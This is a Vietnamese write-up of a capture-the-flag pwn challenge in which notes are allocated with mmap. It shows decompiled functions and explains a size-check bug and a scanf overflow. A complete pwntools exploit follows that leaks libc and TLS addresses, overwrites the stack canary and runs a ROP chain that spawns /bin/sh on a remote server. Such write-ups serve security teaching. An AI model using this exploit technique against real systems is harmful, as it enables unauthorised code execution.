# mmap

Đây là challenge cũng không khó trong kì thi, tuy nhiên để giải nó bạn cần kiến thức về `thread local storage` và một chút trick để giải được :))

## Checksec



Full protection 

## Reverse

Bài này có flow của một bài heap rất quen thuộc, bao gồm `create()`, `edit()`, `show()` và `delete()`. sự khác biệt ở đây là họ không dùng `malloc` mà dùng `mmap`

### Hàm `main()`
while loop với 4 option

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // [rsp+1Ch] [rbp-4h]

  setupbuf(argc, argv, envp);
  while ( 1 )
  {
    menu();
    v3 = readchoice(argc);
    if ( !v3 )
      break;
    if ( v3 == 4 )
    {
      delete(argc);
    }
    else
    {
      if ( v3 > 4 )
      {
        puts("Invalid choice. Exiting!");
        exit(1);
      }
      if ( v3 == 3 )
      {
        show(argc);
      }
      else if ( v3 == 1 )
      {
        add(argc);
      }
      else
      {
        edit(argc);
      }
    }
  }
  _exit(0);
}
```

### Hàm `readchoice`

```c
unsigned __int64 readchoice()
{
  char nptr[8]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v2; // [rsp+8h] [rbp-18h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  *(_QWORD *)nptr = 0LL;
  v2 = 0LL;
  printf("Your choice : ");
  __isoc99_scanf("%s", nptr);
  return strtoul(nptr, 0LL, 10);
}
```

Có lỗi buffer overflow `scanf("%s")`. Tuy nhiên vì chương trình bật cả `canary` và `PIE`, chúng ta cần leak một một địa chỉ và giá trị của `canary` để có thể attack

### Hàm `add` 

```c
int add()
{
  unsigned int v1; // ebx
  unsigned int v2[3]; // [rsp+Ch] [rbp-14h] BYREF

  v2[0] = 0;
  printf("Index: ");
  __isoc99_scanf("%u%*c", v2);
  if ( v2[0] > 0xF )
    return puts("Invalid index!");
  printf("Size: ");
  __isoc99_scanf("%u%*c", &gSize[v2[0]]);
  if ( !gSize[v2[0]] )
    return puts("Empty note. Try again later.");
  if ( gSize[v2[0]] > 0x2000 )
    return puts("Why your note take so much space? Add another one...");
  v1 = v2[0];
  qword_4090[4 * v1] = mmap(0LL, gSize[v2[0]], 3, 34, 0, 0LL);
  if ( qword_4090[4 * v1] == -1LL )
  {
    puts("Somehow mmap failed. WTF!");
    exit(0);
  }
  printf("Write something to your note: ");
  readline(qword_4090[4 * v2[0]], gSize[v2[0]]);
  generate_name(v2[0]);
  return printf("Your note has an unique name: %s\n", (const char *)&gNotes + 32 * v2[0]);
}
```

Mình rất thường hay phân tích hàm `add` khi vào các bài heap trước. Vì nó sẽ cho chúng ta cái nhìn tổng quát về cấu trúc dữ liệu mà chương trình dùng.
Ở đây cấu trúc dữ liệu  chương trình sẽ như sau:



Và nếu bạn tinh ý hay có chút kinh nghiệm, dễ dàng nhận ra được bug trong hàm này, đó là nếu như ta nhập một giá trị > 0x2000 vào `gSize` của một node. Hàm sẽ thoát ngay nhưng vẫn lưu giá trị đó ở trong `gSize`, tức là ta có thể sửa size của một note bất kì để tạo ra lỗi buffer overflow.

flow như sau: `add(0, 0x2000)` -> `add(0, 0x5000)` sẽ tạo ra node ở index 0 với size thật là 0x2000 và size ở `gSize` là 0x5000. Lúc này ta có thể lợi dụng các hàm phía sau như `edit` hay `delete` 

### Hàm `edit`

## Exploit

```python
#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./chall_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				b*show
				b*edit+233
				b*system
			''' + 'c\n' * 1)
		else:
			raw_input('DEBUG')
	else:
		s = remote('34.143.130.87', 4096)

	return s

s = conn()

elf = ELF('./chall_patched')
libc = ELF('libc.so.6')

offset = 0x21a580

def create(index, size, data = None):
	s.sendlineafter(b'Your choice : ', b'1')
	s.sendlineafter(b'Index: ', str(index).encode())
	s.sendlineafter(b'Size: ', str(size).encode())
	if data:
		s.sendafter(b'Write something to your note: ', data)

def edit(index, data):
	s.sendlineafter(b'Your choice : ', b'2')
	s.sendlineafter(b'Index: ', str(index).encode())
	s.sendafter(b'Write your new note: ', data)


def show(index):
	s.sendlineafter(b'Your choice : ', b'3')
	s.sendlineafter(b'Which one to open? ', str(index).encode())

def dump(offset):
	payload = b''
	for i in range(0x2000, offset, 8):
		create(0, i)
		edit(0, b'A' * 0x2000)

for i in range(1):
	create(10, 0x2000, b'A\n')
create(0, 0x2000, b'A\n')
show(0)
create(0, 0x46b0)
edit(0, b'A' * 0x46b0)
show(0)

s.recvuntil(b':\n')
d = s.recvuntil(b'A' * 0x46b0)

print(hex(len(d)))
# print(s.recv())

leak = int.from_bytes(s.recv(6), byteorder = 'little', signed = False)
libc.address = leak - offset
canary_addr = leak - 0x21ce20
usefull = libc.address - 0x9000
log.info('Leak: 0x%x', leak)
log.info('Libc base: 0x%x', libc.address)
log.info('Canary address: 0x%x', canary_addr)

create(0, 0x4770)

payload = b'A' * 0x46b0 + p64(leak)

val = [0x7dc0, 0, -0x5c0c0, -0x5bac0, -0x5b1c0] 
val2 = [-0x21ce40, -0x21c420, -0x21ce40, 0, 0]

for i in val:
	if i:
		payload += p64(leak + i)
	else:
		payload += p64(0)

for i in range(12):
	payload += p64(0)

for i in val2:
	if i:
		payload += p64(leak + i)
	else:
		payload += p64(0)

payload += p64(0)

assert(len(payload) == 0x4770)
assert(b'\x20' not in payload)
assert(b'\n' not in payload)

edit(0, payload)

rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address

payload = b'1' + b'\x00' * 7 + p64(0) * 4 + p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
s.sendlineafter(b'Your choice : ', payload)

s.interactive()
```

Flag: Bài này mình quên lưu lại flag rồi, và lúc mình viết writeup này thì server cũng đóng mất tiêu :))

